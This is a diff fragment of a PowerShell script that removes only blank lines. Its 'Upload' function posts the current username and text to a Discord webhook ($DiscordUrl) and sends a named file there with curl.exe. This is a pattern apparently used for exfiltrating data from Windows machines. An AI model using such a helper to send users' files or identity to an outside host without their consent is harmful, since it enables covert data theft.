@@ -21,7 +21,6 @@ function Delete {
 }
 
 function Upload {
-
 [CmdletBinding()]
 param (
     [parameter(Position=0,Mandatory=$False)]
@@ -30,8 +29,6 @@ param (
     [string]$text 
 )
 
-
-
 $Body = @{
   'username' = $env:username
   'content' = $text
@@ -39,7 +36,6 @@ $Body = @{
 
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)};
-
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
 }
 
